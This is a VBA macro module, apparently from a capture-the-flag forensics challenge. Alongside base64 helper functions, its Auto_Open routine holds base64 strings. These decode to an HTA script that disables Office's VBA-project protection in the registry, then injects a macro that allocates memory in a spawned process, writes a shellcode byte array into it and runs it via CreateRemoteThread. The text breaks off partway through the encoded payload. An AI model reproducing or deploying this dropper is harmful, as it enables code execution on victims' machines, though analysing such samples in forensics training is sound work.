Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Private Const clOneMask = 16515072
Private Const clTwoMask = 258048
Private Const clThreeMask = 4032
Private Const clFourMask = 63

Private Const clHighMask = 16711680
Private Const clMidMask = 65280
Private Const clLowMask = 255

Private Const cl2Exp18 = 262144
Private Const cl2Exp12 = 4096
Private Const cl2Exp6 = 64
Private Const cl2Exp8 = 256
Private Const cl2Exp16 = 65536

Public Function LeOyoqoF(sString As String) As String

    Dim bTrans(63) As Byte, lPowers8(255) As Long, lPowers16(255) As Long, bOut() As Byte, bIn() As Byte
    Dim lChar As Long, lTrip As Long, iPad As Integer, lLen As Long, lTemp As Long, lPos As Long, lOutSize As Long

    For lTemp = 0 To 63
        Select Case lTemp
            Case 0 To 25
                bTrans(lTemp) = 65 + lTemp
            Case 26 To 51
                bTrans(lTemp) = 71 + lTemp
            Case 52 To 61
                bTrans(lTemp) = lTemp - 4
            Case 62
                bTrans(lTemp) = 43
            Case 63
                bTrans(lTemp) = 47
        End Select
    Next lTemp

    For lTemp = 0 To 255
        lPowers8(lTemp) = lTemp * cl2Exp8
        lPowers16(lTemp) = lTemp * cl2Exp16
    Next lTemp

    iPad = Len(sString) Mod 3
    If iPad Then
        iPad = 3 - iPad
        sString = sString & String(iPad, Chr(0))
    End If

    bIn = StrConv(sString, vbFromUnicode)
    lLen = ((UBound(bIn) + 1) \ 3) * 4
    lTemp = lLen \ 72
    lOutSize = ((lTemp * 2) + lLen) - 1
    ReDim bOut(lOutSize)

    lLen = 0

    For lChar = LBound(bIn) To UBound(bIn) Step 3
        lTrip = lPowers16(bIn(lChar)) + lPowers8(bIn(lChar + 1)) + bIn(lChar + 2)
        lTemp = lTrip And clOneMask
        bOut(lPos) = bTrans(lTemp \ cl2Exp18)
        lTemp = lTrip And clTwoMask
        bOut(lPos + 1) = bTrans(lTemp \ cl2Exp12)
        lTemp = lTrip And clThreeMask
        bOut(lPos + 2) = bTrans(lTemp \ cl2Exp6)
        bOut(lPos + 3) = bTrans(lTrip And clFourMask)
        If lLen = 68 Then
            bOut(lPos + 4) = 13
            bOut(lPos + 5) = 10
            lLen = 0
            lPos = lPos + 6
        Else
            lLen = lLen + 4
            lPos = lPos + 4
        End If
    Next lChar

    If bOut(lOutSize) = 10 Then lOutSize = lOutSize - 2

    If iPad = 1 Then
        bOut(lOutSize) = 61
    ElseIf iPad = 2 Then
        bOut(lOutSize) = 61
        bOut(lOutSize - 1) = 61
    End If

    LeOyoqoF = StrConv(bOut, vbUnicode)

End Function

Public Function deobfuscate(sString As String) As String

    Dim bOut() As Byte, bIn() As Byte, bTrans(255) As Byte, lPowers6(63) As Long, lPowers12(63) As Long
    Dim lPowers18(63) As Long, lQuad As Long, iPad As Integer, lChar As Long, lPos As Long, sOut As String
    Dim lTemp As Long

    sString = Replace(sString, vbCr, vbNullString)
    sString = Replace(sString, vbLf, vbNullString)

    lTemp = Len(sString) Mod 4
    If lTemp Then
        Call Err.Raise(vbObjectError, "", "")
    End If

    If InStrRev(sString, "==") Then
        iPad = 2
    ElseIf InStrRev(sString, "=") Then
        iPad = 1
    End If

    For lTemp = 0 To 255
        Select Case lTemp
            Case 65 To 90
                bTrans(lTemp) = lTemp - 65
            Case 97 To 122
                bTrans(lTemp) = lTemp - 71
            Case 48 To 57
                bTrans(lTemp) = lTemp + 4
            Case 43
                bTrans(lTemp) = 62
            Case 47
                bTrans(lTemp) = 63
        End Select
    Next lTemp

    For lTemp = 0 To 63
        lPowers6(lTemp) = lTemp * cl2Exp6
        lPowers12(lTemp) = lTemp * cl2Exp12
        lPowers18(lTemp) = lTemp * cl2Exp18
    Next lTemp

    bIn = StrConv(sString, vbFromUnicode)
    ReDim bOut((((UBound(bIn) + 1) \ 4) * 3) - 1)

    For lChar = 0 To UBound(bIn) Step 4
        lQuad = lPowers18(bTrans(bIn(lChar))) + lPowers12(bTrans(bIn(lChar + 1))) + _
                lPowers6(bTrans(bIn(lChar + 2))) + bTrans(bIn(lChar + 3))
        lTemp = lQuad And clHighMask
        bOut(lPos) = lTemp \ cl2Exp16
        lTemp = lQuad And clMidMask
        bOut(lPos + 1) = lTemp \ cl2Exp8
        bOut(lPos + 2) = lQuad And clLowMask
        lPos = lPos + 3
    Next lChar

    sOut = StrConv(bOut, vbUnicode)
    If iPad Then sOut = Left$(sOut, Len(sOut) - iPad)
    deobfuscate = sOut

End Function

Sub Auto_Open()
    Dim payload, output_file_path
    Dim p1, p2, p3

    output_file_path = "/root/workspace/ctf/hackthebox/forensics/obfsc4t10n/payload.hta"
    p1 = "PGh0bWw+PGhlYWQ+PHNjcmlwdCBsYW5ndWFnZT0idmJzY3JpcHQiPgpEaW0gb2JqRXhjZWwsIFdzaFNoZWxsLCBSZWdQYXRoLCBhY3Rpb24sIG9ialdvcmtib29rLCB4bG1vZHVsZQoKU2V0IG9iakV4Y2VsID0gQ3JlYXRlT2JqZWN0KCJFeGNlbC5BcHBsaWNhdGlvbiIpCm9iakV4Y2VsLlZpc2libGUgPSBGYWxzZQoKU2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXc2NyaXB0LlNoZWxsIikKCmZ1bmN0aW9uIFJlZ0V4aXN0cyhyZWdLZXkpCiAgICAgICAgb24gZXJyb3IgcmVzdW1lIG5leHQKICAgICAgICBXc2hTaGVsbC5SZWdSZWFkIHJlZ0tleQogICAgICAgIFJlZ0V4aXN0cyA9IChFcnIubnVtYmVyID0gMCkKZW5kIGZ1bmN0aW9uCgonIEdldCB0aGUgb2xkIEFjY2Vzc1ZCT00gdmFsdWUKUmVnUGF0aCA9ICJIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcT2ZmaWNlXCIgJiBvYmpFeGNlbC5WZXJzaW9uICYgIlxFeGNlbFxTZWN1cml0eVxBY2Nlc3NWQk9NIgoKaWYgUmVnRXhpc3RzKFJlZ1BhdGgpIHRoZW4KICAgICAgICBhY3Rpb24gPSBXc2hTaGVsbC5SZWdSZWFkKFJlZ1BhdGgpCmVsc2UKICAgICAgICBhY3Rpb24gPSAiIgplbmQgaWYKCicgV2Vha2VuIHRoZSB0YXJnZXQKV3NoU2hlbGwuUmVnV3JpdGUgUmVnUGF0aCwgMSwgIlJFR19EV09SRCIKCicgUnVuIHRoZSBtYWNybwpTZXQgb2JqV29ya2Jvb2sgPSBvYmpFeGNlbC5Xb3JrYm9va3MuQWRkKCkKU2V0IHhsbW9kdWxlID0gb2JqV29ya2Jvb2suVkJQcm9qZWN0LlZCQ29tcG9uZW50cy5BZGQoMSkKeGxtb2R1bGUuQ29kZU1vZHVsZS5BZGRGcm9tU3RyaW5nICJQcml2YXRlICImIlR5cGUgUFJPIiYiQ0VTU19JTkYiJiJPUk1BVElPTiImQ2hyKDEwKSYiICAgIGhQcm8iJiJjZXNzIEFzICImIkxvbmciJkNocigxMCkmIiAgICBoVGhyIiYiZWFkIEFzIEwiJiJvbmciJkNocigxMCkmIiAgICBkd1ByIiYib2Nlc3NJZCAiJiJBcyBMb25nIiZDaHIoMTApJiIgICAgZHdUaCImInJlYWRJZCBBIiYicyBMb25nIiZDaHIoMTApJiBfCiJFbmQgVHlwZSImQ2hyKDEwKSZDaHIoMTApJiJQcml2YXRlICImIlR5cGUgU1RBIiYiUlRVUElORk8iJkNocigxMCkmIiAgICBjYiBBIiYicyBMb25nIiZDaHIoMTApJiIgICAgbHBSZSImInNlcnZlZCBBIiYicyBTdHJpbmciJkNocigxMCkmIiAgICBscERlIiYic2t0b3AgQXMiJiIgU3RyaW5nIiZDaHIoMTApJiIgICAgbHBUaSImInRsZSBBcyBTIiYidHJpbmciJiBfCkNocigxMCkmIiAgICBkd1ggIiYiQXMgTG9uZyImQ2hyKDEwKSYiICAgIGR3WSAiJiJBcyBMb25nIiZDaHIoMTApJiIgICAgZHdYUyImIml6ZSBBcyBMIiYib25nIiZDaHIoMTApJiIgICAgZHdZUyImIml6ZSBBcyBMIiYib25nIiZDaHIoMTApJiIgICAgZHdYQyImIm91bnRDaGFyIiYicyBBcyBMb24iJiJnIiZDaHIoMTApJiIgICAgZHdZQyImIm91bnRDaGFyIiYgXwoicyBBcyBMb24iJiJnIiZDaHIoMTApJiIgICAgZHdGaSImImxsQXR0cmliIiYidXRlIEFzIEwiJiJvbmciJkNocigxMCkmIiAgICBkd0ZsIiYiYWdzIEFzIEwiJiJvbmciJkNocigxMCkmIiAgICB3U2hvIiYid1dpbmRvdyAiJiJBcyBJbnRlZyImImVyIiZDaHIoMTApJiIgICAgY2JSZSImInNlcnZlZDIgIiYiQXMgSW50ZWciJiJlciImQ2hyKDEwKSYiICAgIGxwUmUiJiBfCiJzZXJ2ZWQyICImIkFzIExvbmciJkNocigxMCkmIiAgICBoU3RkIiYiSW5wdXQgQXMiJiIgTG9uZyImQ2hyKDEwKSYiICAgIGhTdGQiJiJPdXRwdXQgQSImInMgTG9uZyImQ2hyKDEwKSYiICAgIGhTdGQiJiJFcnJvciBBcyImIiBMb25nIiZDaHIoMTApJiJFbmQgVHlwZSImQ2hyKDEwKSZDaHIoMTApJkNocigzNSkmIklmIFZCQTcgIiYiVGhlbiImQ2hyKDEwKSYgXwoiICAgIFByaXYiJiJhdGUgRGVjbCImImFyZSBQdHJTIiYiYWZlIEZ1bmMiJiJ0aW9uIENyZSImImF0ZVN0dWZmIiYiIExpYiAiJkNocigzNCkmImtlcm5lbDMyIiZDaHIoMzQpJiIgQWxpYXMgIiZDaHIoMzQpJiJDcmVhdGVSZSImIm1vdGVUaHJlIiYiYWQiJkNocigzNCkmIiAiJkNocig0MCkmIkJ5VmFsIGhQIiYicm9jZXNzIEEiJiJzIExvbmciJkNocig0NCkmIF8KIiBCeVZhbCBsIiYicFRocmVhZEEiJiJ0dHJpYnV0ZSImInMgQXMgTG9uIiYiZyImQ2hyKDQ0KSYiIEJ5VmFsIGQiJiJ3U3RhY2tTaSImInplIEFzIExvIiYibmciJkNocig0NCkmIiBCeVZhbCBsIiYicFN0YXJ0QWQiJiJkcmVzcyBBcyImIiBMb25nUHRyIiZDaHIoNDQpJiIgbHBQYXJhbSImImV0ZXIgQXMgIiYiTG9uZyImQ2hyKDQ0KSYiIEJ5VmFsIGQiJiBfCiJ3Q3JlYXRpbyImIm5GbGFncyBBIiYicyBMb25nIiZDaHIoNDQpJiIgbHBUaHJlYSImImRJRCBBcyBMIiYib25nIiZDaHIoNDEpJiIgQXMgTG9uZyImIlB0ciImQ2hyKDEwKSYiICAgIFByaXYiJiJhdGUgRGVjbCImImFyZSBQdHJTIiYiYWZlIEZ1bmMiJiJ0aW9uIEFsbCImIm9jU3R1ZmYgIiYiTGliICImQ2hyKDM0KSYia2VybmVsMzIiJkNocigzNCkmIiBBbGlhcyAiJiBfCkNocigzNCkmIlZpcnR1YWxBIiYibGxvY0V4IiZDaHIoMzQpJiIgIiZDaHIoNDApJiJCeVZhbCBoUCImInJvY2VzcyBBIiYicyBMb25nIiZDaHIoNDQpJiIgQnlWYWwgbCImInBBZGRyIEFzIiYiIExvbmciJkNocig0NCkmIiBCeVZhbCBsIiYiU2l6ZSBBcyAiJiJMb25nIiZDaHIoNDQpJiIgQnlWYWwgZiImImxBbGxvY2F0IiYiaW9uVHlwZSAiJiJBcyBMb25nIiYgXwpDaHIoNDQpJiIgQnlWYWwgZiImImxQcm90ZWN0IiYiIEFzIExvbmciJkNocig0MSkmIiBBcyBMb25nIiYiUHRyIiZDaHIoMTApJiIgICAgUHJpdiImImF0ZSBEZWNsIiYiYXJlIFB0clMiJiJhZmUgRnVuYyImInRpb24gV3JpIiYidGVTdHVmZiAiJiJMaWIgIiZDaHIoMzQpJiJrZXJuZWwzMiImQ2hyKDM0KSYiIEFsaWFzICImQ2hyKDM0KSYiV3JpdGVQcm8iJiBfCiJjZXNzTWVtbyImInJ5IiZDaHIoMzQpJiIgIiZDaHIoNDApJiJCeVZhbCBoUCImInJvY2VzcyBBIiYicyBMb25nIiZDaHIoNDQpJiIgQnlWYWwgbCImIkRlc3QgQXMgIiYiTG9uZ1B0ciImQ2hyKDQ0KSYiIEJ5UmVmIFMiJiJvdXJjZSBBcyImIiBBbnkiJkNocig0NCkmIiBCeVZhbCBMIiYiZW5ndGggQXMiJiIgTG9uZyImQ2hyKDQ0KSYiIEJ5VmFsIEwiJiBfCiJlbmd0aFdybyImInRlIEFzIExvIiYibmdQdHIiJkNocig0MSkmIiBBcyBMb25nIiYiUHRyIiZDaHIoMTApJiIgICAgUHJpdiImImF0ZSBEZWNsIiYiYXJlIFB0clMiJiJhZmUgRnVuYyImInRpb24gUnVuIiYiU3R1ZmYgTGkiJiJiICImQ2hyKDM0KSYia2VybmVsMzIiJkNocigzNCkmIiBBbGlhcyAiJkNocigzNCkmIkNyZWF0ZVByIiYib2Nlc3NBIiZDaHIoMzQpJiBfCiIgIiZDaHIoNDApJiJCeVZhbCBscCImIkFwcGxpY2F0IiYiaW9uTmFtZSAiJiJBcyBTdHJpbiImImciJkNocig0NCkmIiBCeVZhbCBsIiYicENvbW1hbmQiJiJMaW5lIEFzICImIlN0cmluZyImQ2hyKDQ0KSYiIGxwUHJvY2UiJiJzc0F0dHJpYiImInV0ZXMgQXMgIiYiQW55IiZDaHIoNDQpJiIgbHBUaHJlYSImImRBdHRyaWJ1IiYidGVzIEFzIEEiJiJueSImIF8KQ2hyKDQ0KSYiIEJ5VmFsIGIiJiJJbmhlcml0SCImImFuZGxlcyBBIiYicyBMb25nIiZDaHIoNDQpJiIgQnlWYWwgZCImIndDcmVhdGlvIiYibkZsYWdzIEEiJiJzIExvbmciJkNocig0NCkmIiBscEVudmlyIiYib25tZW50IEEiJiJzIEFueSImQ2hyKDQ0KSYiIEJ5VmFsIGwiJiJwQ3VycmVudCImIkRpcmVjdG9yIiYieSBBcyBTdHIiJiJpbmciJkNocig0NCkmIF8KIiBscFN0YXJ0IiYidXBJbmZvIEEiJiJzIFNUQVJUVSImIlBJTkZPIiZDaHIoNDQpJiIgbHBQcm9jZSImInNzSW5mb3JtIiYiYXRpb24gQXMiJiIgUFJPQ0VTUyImIl9JTkZPUk1BIiYiVElPTiImQ2hyKDQxKSYiIEFzIExvbmciJkNocigxMCkmQ2hyKDM1KSYiRWxzZSImQ2hyKDEwKSYiICAgIFByaXYiJiJhdGUgRGVjbCImImFyZSBGdW5jIiYidGlvbiBDcmUiJiBfCiJhdGVTdHVmZiImIiBMaWIgIiZDaHIoMzQpJiJrZXJuZWwzMiImQ2hyKDM0KSYiIEFsaWFzICImQ2hyKDM0KSYiQ3JlYXRlUmUiJiJtb3RlVGhyZSImImFkIiZDaHIoMzQpJiIgIiZDaHIoNDApJiJCeVZhbCBoUCImInJvY2VzcyBBIiYicyBMb25nIiZDaHIoNDQpJiIgQnlWYWwgbCImInBUaHJlYWRBIiYidHRyaWJ1dGUiJiJzIEFzIExvbiImImciJkNocig0NCkmIF8KIiBCeVZhbCBkIiYid1N0YWNrU2kiJiJ6ZSBBcyBMbyImIm5nIiZDaHIoNDQpJiIgQnlWYWwgbCImInBTdGFydEFkIiYiZHJlc3MgQXMiJiIgTG9uZyImQ2hyKDQ0KSYiIGxwUGFyYW0iJiJldGVyIEFzICImIkxvbmciJkNocig0NCkmIiBCeVZhbCBkIiYid0NyZWF0aW8iJiJuRmxhZ3MgQSImInMgTG9uZyImQ2hyKDQ0KSYiIGxwVGhyZWEiJiJkSUQgQXMgTCImIF8KIm9uZyImQ2hyKDQxKSYiIEFzIExvbmciJkNocigxMCkmIiAgICBQcml2IiYiYXRlIERlY2wiJiJhcmUgRnVuYyImInRpb24gQWxsIiYib2NTdHVmZiAiJiJMaWIgIiZDaHIoMzQpJiJrZXJuZWwzMiImQ2hyKDM0KSYiIEFsaWFzICImQ2hyKDM0KSYiVmlydHVhbEEiJiJsbG9jRXgiJkNocigzNCkmIiAiJkNocig0MCkmIkJ5VmFsIGhQIiYicm9jZXNzIEEiJiBfCiJzIExvbmciJkNocig0NCkmIiBCeVZhbCBsIiYicEFkZHIgQXMiJiIgTG9uZyImQ2hyKDQ0KSYiIEJ5VmFsIGwiJiJTaXplIEFzICImIkxvbmciJkNocig0NCkmIiBCeVZhbCBmIiYibEFsbG9jYXQiJiJpb25UeXBlICImIkFzIExvbmciJkNocig0NCkmIiBCeVZhbCBmIiYibFByb3RlY3QiJiIgQXMgTG9uZyImQ2hyKDQxKSYiIEFzIExvbmciJkNocigxMCkmIF8KIiAgICBQcml2IiYiYXRlIERlY2wiJiJhcmUgRnVuYyImInRpb24gV3JpIiYidGVTdHVmZiAiJiJMaWIgIiZDaHIoMzQpJiJrZXJuZWwzMiImQ2hyKDM0KSYiIEFsaWFzICImQ2hyKDM0KSYiV3JpdGVQcm8iJiJjZXNzTWVtbyImInJ5IiZDaHIoMzQpJiIgIiZDaHIoNDApJiJCeVZhbCBoUCImInJvY2VzcyBBIiYicyBMb25nIiZDaHIoNDQpJiIgQnlWYWwgbCImIF8KIkRlc3QgQXMgIiYiTG9uZyImQ2hyKDQ0KSYiIEJ5UmVmIFMiJiJvdXJjZSBBcyImIiBBbnkiJkNocig0NCkmIiBCeVZhbCBMIiYiZW5ndGggQXMiJiIgTG9uZyImQ2hyKDQ0KSYiIEJ5VmFsIEwiJiJlbmd0aFdybyImInRlIEFzIExvIiYibmciJkNocig0MSkmIiBBcyBMb25nIiZDaHIoMTApJiIgICAgUHJpdiImImF0ZSBEZWNsIiYiYXJlIEZ1bmMiJiJ0aW9uIFJ1biImIF8KIlN0dWZmIExpIiYiYiAiJkNocigzNCkmImtlcm5lbDMyIiZDaHIoMzQpJiIgQWxpYXMgIiZDaHIoMzQpJiJDcmVhdGVQciImIm9jZXNzQSImQ2hyKDM0KSYiICImQ2hyKDQwKSYiQnlWYWwgbHAiJiJBcHBsaWNhdCImIm"
    p2 = "lvbk5hbWUgIiYiQXMgU3RyaW4iJiJnIiZDaHIoNDQpJiIgQnlWYWwgbCImInBDb21tYW5kIiYiTGluZSBBcyAiJiJTdHJpbmciJkNocig0NCkmIF8KIiBscFByb2NlIiYic3NBdHRyaWIiJiJ1dGVzIEFzICImIkFueSImQ2hyKDQ0KSYiIGxwVGhyZWEiJiJkQXR0cmlidSImInRlcyBBcyBBIiYibnkiJkNocig0NCkmIiBCeVZhbCBiIiYiSW5oZXJpdEgiJiJhbmRsZXMgQSImInMgTG9uZyImQ2hyKDQ0KSYiIEJ5VmFsIGQiJiJ3Q3JlYXRpbyImIm5GbGFncyBBIiYicyBMb25nIiZDaHIoNDQpJiIgbHBFbnZpciImIF8KIm9ubWVudCBBIiYicyBBbnkiJkNocig0NCkmIiBCeVZhbCBsIiYicEN1cnJlbnQiJiJEcmllY3RvciImInkgQXMgU3RyIiYiaW5nIiZDaHIoNDQpJiIgbHBTdGFydCImInVwSW5mbyBBIiYicyBTVEFSVFUiJiJQSU5GTyImQ2hyKDQ0KSYiIGxwUHJvY2UiJiJzc0luZm9ybSImImF0aW9uIEFzIiYiIFBST0NFU1MiJiJfSU5GT1JNQSImIlRJT04iJkNocig0MSkmIF8KIiBBcyBMb25nIiZDaHIoMTApJkNocigzNSkmIkVuZCBJZiImQ2hyKDEwKSZDaHIoMTApJiJTdWIgQXV0byImIl9PcGVuIiZDaHIoNDApJkNocig0MSkmQ2hyKDEwKSYiICAgIERpbSAiJiJteUJ5dGUgQSImInMgTG9uZyImQ2hyKDQ0KSYiIG15QXJyYXkiJiIgQXMgVmFyaSImImFudCImQ2hyKDQ0KSYiIG9mZnNldCAiJiJBcyBMb25nIiZDaHIoMTApJiIgICAgRGltICImIF8KInBJbmZvIEFzIiYiIFBST0NFU1MiJiJfSU5GT1JNQSImIlRJT04iJkNocigxMCkmIiAgICBEaW0gIiYic0luZm8gQXMiJiIgU1RBUlRVUCImIklORk8iJkNocigxMCkmIiAgICBEaW0gIiYic051bGwgQXMiJiIgU3RyaW5nIiZDaHIoMTApJiIgICAgRGltICImInNQcm9jIEFzIiYiIFN0cmluZyImQ2hyKDEwKSZDaHIoMTApJkNocigzNSkmIklmIFZCQTcgIiYgXwoiVGhlbiImQ2hyKDEwKSYiICAgIERpbSAiJiJyd3hwYWdlICImIkFzIExvbmdQIiYidHIiJkNocig0NCkmIiByZXMgQXMgIiYiTG9uZ1B0ciImQ2hyKDEwKSZDaHIoMzUpJiJFbHNlIiZDaHIoMTApJiIgICAgRGltICImInJ3eHBhZ2UgIiYiQXMgTG9uZyImQ2hyKDQ0KSYiIHJlcyBBcyAiJiJMb25nIiZDaHIoMTApJkNocigzNSkmIkVuZCBJZiImQ2hyKDEwKSYgXwoiICAgIG15QXIiJiJyYXkgIiZDaHIoNjEpJiIgQXJyYXkiJkNocig0MCkmQ2hyKDQ1KSYiMzUiJkNocig0NCkmQ2hyKDQ1KSYiNjMiJkNocig0NCkmQ2hyKDQ1KSYiNjUiJkNocig0NCkmIjMyIiZDaHIoNDQpJiI4NiImQ2hyKDQ0KSYiNjYiJkNocig0NCkmIjEyNiImQ2hyKDQ0KSZDaHIoNDUpJiIzOSImQ2hyKDQ0KSYiMTE2IiZDaHIoNDQpJiIzNiImQ2hyKDQ0KSYgXwpDaHIoNDUpJiIxMiImQ2hyKDQ0KSYiOTEiJkNocig0NCkmIjQ5IiZDaHIoNDQpJkNocig0NSkmIjU1IiZDaHIoNDQpJkNocig0NSkmIjc5IiZDaHIoNDQpJiI5OCImQ2hyKDQ0KSYiNDkiJkNocig0NCkmIjEyMyImQ2hyKDQ0KSYiMjQiJkNocig0NCkmIjMiJkNocig0NCkmIjEyMyImQ2hyKDQ0KSYiMjQiJkNocig0NCkmQ2hyKDQ1KSYiMTI1IiZDaHIoNDQpJiBfIApDaHIoNDUpJiI2MSImQ2hyKDQ0KSYiMzYiJkNocig0NCkmQ2hyKDQ1KSYiNzYiJkNocig0NCkmQ2hyKDQ1KSYiNzMiJkNocig0NCkmQ2hyKDQ1KSYiMTI2IiZDaHIoNDQpJkNocig0NSkmIjUyIiZDaHIoNDQpJkNocig0NSkmIjcwIiZDaHIoNDQpJiI1NiImQ2hyKDQ0KSYiMTIzIiZDaHIoNDQpJiIxMiImQ2hyKDQ0KSZDaHIoNDUpJiIzNyImQ2hyKDQ0KSZDaHIoNDUpJiBfIAoiNzkiJkNocig0NCkmQ2hyKDQ1KSYiOTgiJkNocig0NCkmIjYxIiZDaHIoNDQpJkNocig0NSkmIjM3IiZDaHIoNDQpJkNocig0NSkmIjkwIiZDaHIoNDQpJkNocig0NSkmIjIxIiZDaHIoNDQpJiIxMDkiJkNocig0NCkmQ2hyKDQ1KSYiMjEiJkNocig0NCkmQ2hyKDQ1KSYiODMiJkNocig0NCkmQ2hyKDQ1KSYiNjYiJkNocig0NCkmQ2hyKDQ1KSYiMTI3IiZDaHIoNDQpJiBfIApDaHIoNDUpJiIxMjgiJkNocig0NCkmQ2hyKDQ1KSYiMzIiJkNocig0NCkmIjQyIiZDaHIoNDQpJiIxOCImQ2hyKDQ0KSZDaHIoNDUpJiIyOCImQ2hyKDQ0KSYiNDQiJkNocig0NCkmIjkyIiZDaHIoNDQpJkNocig0NSkmIjEwOSImQ2hyKDQ0KSYiNjciJkNocig0NCkmIjExIiZDaHIoNDQpJiI4MyImQ2hyKDQ0KSYiMzYiJkNocig0NCkmQ2hyKDQ1KSYiMSImQ2hyKDQ0KSYgXyAKIjExMSImQ2hyKDQ0KSZDaHIoNDUpJiIxNCImQ2hyKDQ0KSZDaHIoNDUpJiI5MCImQ2hyKDQ0KSYiMiImQ2hyKDQ0KSZDaHIoNDUpJiI2OCImQ2hyKDQ0KSZDaHIoNDUpJiI0NCImQ2hyKDQ0KSZDaHIoNDUpJiIxMDUiJkNocig0NCkmQ2hyKDQ1KSYiNTIiJkNocig0NCkmQ2hyKDQ1KSYiNzkiJkNocig0NCkmIjIxIiZDaHIoNDQpJkNocig0NSkmIjQ4IiZDaHIoNDQpJiBfIAoiNDkiJkNocig0NCkmIjU5IiZDaHIoNDQpJiI3MSImQ2hyKDQ0KSZDaHIoNDUpJiIxMTkiJkNocig0NCkmIjYyIiZDaHIoNDQpJkNocig0NSkmIjE4IiZDaHIoNDQpJiIxMjAiJkNocig0NCkmQ2hyKDQ1KSYiNjYiJkNocig0NCkmIjExIiZDaHIoNDQpJiI1MSImQ2hyKDQ0KSZDaHIoNDUpJiIxNCImQ2hyKDQ0KSZDaHIoNDUpJiIxMTYiJkNocig0NCkmQ2hyKDQ1KSYgXyAKIjEwMiImQ2hyKDQ0KSYiNTEiJkNocig0NCkmQ2hyKDQ1KSYiMjUiJkNocig0NCkmIjY4IiZDaHIoNDQpJkNocig0NSkmIjEwMCImQ2hyKDQ0KSYiMTgiJkNocig0NCkmQ2hyKDQ1KSYiNzQiJkNocig0NCkmQ2hyKDQ1KSYiMzMiJkNocig0NCkmQ2hyKDQ1KSYiNTciJkNocig0NCkmQ2hyKDQ1KSYiNzYiJkNocig0NCkmIjU2IiZDaHIoNDQpJiIxMiImQ2hyKDQ0KSYgXyAKIjEyNCImQ2hyKDQ0KSZDaHIoNDUpJiIzIiZDaHIoNDQpJiIzNCImQ2hyKDQ0KSYiODEiJkNocig0NCkmQ2hyKDQ1KSYiNzEiJkNocig0NCkmQ2hyKDQ1KSYiNzMiJkNocig0NCkmQ2hyKDQ1KSYiMzkiJkNocig0NCkmQ2hyKDQ1KSYiOTUiJkNocig0NCkmIjUzIiZDaHIoNDQpJiI3MCImQ2hyKDQ0KSYiOCImQ2hyKDQ0KSZDaHIoNDUpJiI4IiZDaHIoNDQpJkNocig0NSkmIF8gCiI3NCImQ2hyKDQ0KSZDaHIoNDUpJiIyNyImQ2hyKDQ0KSYiMTE3IiZDaHIoNDQpJiI1MyImQ2hyKDQ0KSYiNjkiJkNocig0NCkmQ2hyKDQ1KSYiOSImQ2hyKDQ0KSZDaHIoNDUpJiI3OCImQ2hyKDQ0KSZDaHIoNDUpJiIxNSImQ2hyKDQ0KSZDaHIoNDUpJiI3NCImQ2hyKDQ0KSZDaHIoNDUpJiIxMjYiJkNocig0NCkmQ2hyKDQ1KSYiNTQiJkNocig0NCkmIjIiJiBfIApDaHIoNDQpJiI3NCImQ2hyKDQ0KSZDaHIoNDUpJiIxMDciJkNocig0NCkmIjgiJkNocig0NCkmIjEyMSImQ2hyKDQ0KSZDaHIoNDUpJiIxMTIiJkNocig0NCkmIjE2IiZDaHIoNDQpJkNocig0NSkmIjExNyImQ2hyKDQ0KSZDaHIoNDUpJiIzOSImQ2hyKDQ0KSYiODMiJkNocig0NCkmQ2hyKDQ1KSYiMTI2IiZDaHIoNDQpJiIxMTkiJkNocig0NCkmQ2hyKDQ1KSYgXyAKIjQwIiZDaHIoNDQpJkNocig0NSkmIjgwIiZDaHIoNDQpJiI4NSImQ2hyKDQ0KSZDaHIoNDUpJiIxMyImQ2hyKDQ0KSZDaHIoNDUpJiI0MiImQ2hyKDQ0KSYiMTI1IiZDaHIoNDQpJiIxNyImQ2hyKDQ0KSYiOTEiJkNocig0NCkmQ2hyKDQ1KSYiNiImQ2hyKDQ0KSZDaHIoNDUpJiIxMjgiJkNocig0NCkmQ2hyKDQ1KSYiMTAiJkNocig0NCkmQ2hyKDQ1KSYiNDEiJiBfIApDaHIoNDQpJiI2IiZDaHIoNDQpJiI4IiZDaHIoNDQpJkNocig0NSkmIjciJkNocig0NCkmIjU1IiZDaHIoNDQpJkNocig0NSkmIjExMyImQ2hyKDQ0KSYiNzQiJkNocig0NCkmQ2hyKDQ1KSYiMzQiJkNocig0NCkmQ2hyKDQ1KSYiMTA5IiZDaHIoNDQpJkNocig0NSkmIjQ0IiZDaHIoNDQpJiI5IiZDaHIoNDQpJiIxMjciJkNocig0NCkmQ2hyKDQ1KSYiMTIzIiYgXyAKQ2hyKDQ0KSZDaHIoNDUpJiI4MCImQ2hyKDQ0KSZDaHIoNDUpJiI0IiZDaHIoNDQpJkNocig0NSkmIjEyOCImQ2hyKDQ0KSZDaHIoNDUpJiI0MyImQ2hyKDQ0KSYiMjciJkNocig0NCkmQ2hyKDQ1KSYiOTYiJkNocig0NCkmIjM2IiZDaHIoNDQpJkNocig0NSkmIjk5IiZDaHIoNDQpJkNocig0NSkmIjc5IiZDaHIoNDQpJkNocig0NSkmIjc1IiZDaHIoNDQpJiI4NCImIF8gCkNocig0NCkmQ2hyKDQ1KSYiNCImQ2hyKDQ0KSZDaHIoNDUpJiIzNSImQ2hyKDQ0KSYiMTIyIiZDaHIoNDQpJiI4NSImQ2hyKDQ0KSZDaHIoNDUpJiIxIiZDaHIoNDQpJiIyOSImQ2hyKDQ0KSYiMjEiJkNocig0NCkmQ2hyKDQ1KSYiMTgiJkNocig0NCkmQ2hyKDQ1KSYiMTE2IiZDaHIoNDQpJiI0NyImQ2hyKDQ0KSZDaHIoNDUpJiI3MCImQ2hyKDQ0KSYiNjgiJiBfIApDaHIoNDQpJiIyNyImQ2hyKDQ0KSYiMyImQ2hyKDQ0KSYiNTEiJkNocig0NCkmIjY3IiZDaHIoNDQpJkNocig0NSkmIjM2IiZDaHIoNDQpJiIxMDAiJkNocig0NCkmIjExMCImQ2hyKDQ0KSYiNTEiJkNocig0NCkmIjExNCImQ2hyKDQ0KSZDaHIoNDUpJiIxMDEiJkNocig0NCkmQ2hyKDQ1KSYiMTExIiZDaHIoNDQpJiI2OCImQ2hyKDQ0KSYiOTAiJkNocig0NCkmIF8gCiI5NSImQ2hyKDQ0KSZDaHIoNDUpJiI1OSImQ2hyKDQ0KSYiMjAiJkNocig0NCkmQ2hyKDQ1KSYiMTIiJkNocig0NCkmIjExOCImQ2hyKDQ0KSYiMTAyIiZDaHIoNDQpJkNocig0NSkmIjEiJkNocig0NCkmIjQiJkNocig0NCkmIjExOSI